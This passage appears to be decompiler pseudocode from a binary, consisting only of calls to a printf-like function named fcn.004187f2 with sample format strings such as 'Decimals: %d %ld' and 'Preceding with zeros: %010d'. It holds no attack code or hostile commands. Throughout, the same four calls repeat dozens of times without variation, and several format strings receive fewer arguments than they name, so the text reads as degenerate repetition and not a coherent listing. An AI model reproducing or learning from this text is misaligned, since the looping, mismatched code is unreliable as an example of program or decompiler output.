\\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    